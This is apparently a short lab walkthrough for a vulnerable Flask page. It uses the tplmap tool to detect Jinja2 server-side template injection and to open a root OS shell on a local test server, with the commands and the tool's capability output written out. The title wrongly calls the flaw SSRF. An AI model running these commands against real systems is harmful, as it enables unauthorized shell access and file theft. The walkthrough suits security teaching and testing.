## Flask Jinja2 SSRF (gaining remote shell access)

Using tlpmap a SSTI exploit framework found at: https://github.com/epinna/tplmap 

We can use tlpmap to help discern what parts of ssti the flask page is vulnerable to

In the case of http://10.0.0.19:5000/ssti?name=drew we can test and see if it is vulnerable to specific attacks

To test for attacks execute commands python tplmap.py -u "http://10.0.0.19:5000/ssti?name=drew" and get return results similar to this:

```
dgallis@dgserv:~/tplmap-master$ sudo python tplmap.py -u "http://localhost:5000/ssti?name=John"
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code
```

Based on the return output we can see that this Jinja2 Render Template is vulnerable to remote shell access!

To get remote shell access to access internal files we can execute command:

```
python tplmap.py -u "http://localhost:5000/ssti?name=John" --os-shell
```

One the command is executed you should recieve a shell of the flask app which allows you to traverse and view all local files since the `whoami` user is root.